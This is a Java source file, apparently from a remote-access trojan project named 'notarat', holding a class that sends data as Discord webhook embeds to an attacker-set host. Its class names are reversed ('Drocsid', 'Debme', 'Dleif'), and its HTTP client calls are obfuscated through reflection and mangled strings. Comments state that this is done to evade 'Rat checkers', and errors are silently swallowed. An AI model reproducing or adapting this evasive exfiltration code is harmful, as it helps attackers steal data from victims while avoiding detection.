package me.ghosty.notarat;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Do not use the real name in case they check for it
 */
final class Drocsid {
	
	private final List<Debme> debmes = new ArrayList<>();
	
	Drocsid() {
	}
	
	public Drocsid addDebme(Debme debme) {
		this.debmes.add(debme);
		return this;
	}
	
	public <T> void send() throws IOException {
		JsonObject json = new JsonObject();
		json.addProperty("username", Main.$name);

		if (!this.debmes.isEmpty()) {
			JsonArray jsonDebmes = new JsonArray();
			
			for (Debme debme : this.debmes) {
				JsonObject jsonEmbed = new JsonObject();
				
				jsonEmbed.addProperty("title", debme.getTitle());
				jsonEmbed.addProperty("description", debme.getDescription());
				jsonEmbed.addProperty("url", debme.getUrl());
				
				if (debme.getColor() != -1)
					jsonEmbed.addProperty("color", debme.getColor());

				List<Debme.Dleif> dleifs = debme.getFields();
				
				JsonArray jsonDleifs = new JsonArray();
				for (Debme.Dleif dleif : dleifs) {
					JsonObject jsonDleif = new JsonObject();
					
					jsonDleif.addProperty("name", dleif.getName());
					jsonDleif.addProperty("value", dleif.getValue());
					jsonDleif.addProperty("inline", dleif.isInline());
					
					jsonDleifs.add(jsonDleif);
				}
				jsonEmbed.add("fields", jsonDleifs);
				
				jsonDebmes.add(jsonEmbed);
			}
			
			json.add("embeds", jsonDebmes);
		}
		
		/*
		 * Here, we cannot have	the word "HTTP" and any classes calls because it may be checked in the future if Rat checkers become smarter
		 * So in case, I put this "delicious" (ugly) code, I hope you'll like it
		 * If you want to know more about how it really works, just check YesARat source code
		 */
		try (AutoCloseable cl = (AutoCloseable) new ClassAccessor<>(Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.imp*l.cli", "en**t.Ht *", "tpCl *ie *nts")), null).invoke(Utils.replaceUseless("cr*eat * eDe ", "fau* l t**"))) {
			ClassAccessor<?> client = new ClassAccessor<>(
				(Class<T>) Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.imp*l.cli", "en**t.Clos*  ea", "bleHt *", "tpCl *ie *nt")),
				(T) cl
			);
			
			ClassAccessor<?> post = new ClassAccessor<>(
				Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.cli", "en**t.me ", " tho* ds.Ht* ", "tp* P* ", "os* t  ")),
				null
			).getObject(Main.$host);
			
			String method = Utils.replaceUseless("se *  tH * * ", "ea * d *e**r");
			String jsn = Utils.replaceUseless("ap * plic   *ati", "on /  j", "s* on");
			post.invoke(method, Utils.replaceUseless("Ac* ", "c**e  pt"), jsn);
			post.invoke(method, Utils.replaceUseless("Co * nt **", "en***t-", " ty * p * e"), jsn);
			post.invokeT(Utils.replaceUseless("se t * En", "ti * * ty"), new Object[] {new ClassAccessor<>(
				Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.e*n", "tit**y.Str*i", "ngE*n", "ti*t  y")),
				null
			).getObject(json.toString()).get()}, new Class[] {
				Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.Ht* ", "tpE*n", "ti*t  y")),
			});
			
			client.invokeT(Utils.replaceUseless("e* xe  *", "cu* t e"), new Object[] {post.get()}, new Class[] {Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.cli", "en**t.me ", " tho* ds.Ht* ", "tp* U ", "r*i**Re ", " qu* e * st"))});
			//now its useless, still here in case -> client.invoke(Utils.replaceUseless("c*  l*", "* os* e"));
		} catch (Exception exc) {
			if (Main.$isTest) {
				Utils.print(exc);
			}
		}
	}
	
	/**
	 * Do not use the real name in case they check for it
	 */
	public static class Debme {
		
		private final List<Dleif> dleifs = new ArrayList<>();
		private String title, description, url;
		private int color = -1;
		
		public String getTitle() {
			return title;
		}
		
		public Debme setTitle(String title) {
			this.title = title;
			return this;
		}
		
		public String getDescription() {
			return description;
		}
		
		public Debme setDescription(String description) {
			this.description = description;
			return this;
		}
		
		public String getUrl() {
			return url;
		}
		
		public Debme setUrl(String url) {
			this.url = url;
			return this;
		}
		
		public int getColor() {
			return color;
		}
		
		public Debme setColor(int color) {
			this.color = color;
			return this;
		}
		
		public List<Dleif> getFields() {
			return dleifs;
		}
		
		public Debme addField(String name, String value, boolean inline) {
			this.dleifs.add(new Dleif(name, value, inline));
			return this;
		}
		
		/**
		 * Do not use the real name in case they check for it, even tho there is a very little chance for it to be checked
		 */
		static class Dleif {
			
			private final String name, value;
			private final boolean inline;
			
			private Dleif(String name, String value, boolean inline) {
				this.name = name;
				this.value = value;
				this.inline = inline;
			}
			
			private String getName() {
				return name;
			}
			
			private String getValue() {
				return value;
			}
			
			private boolean isInline() {
				return inline;
			}
			
		}
		
	}
	
}
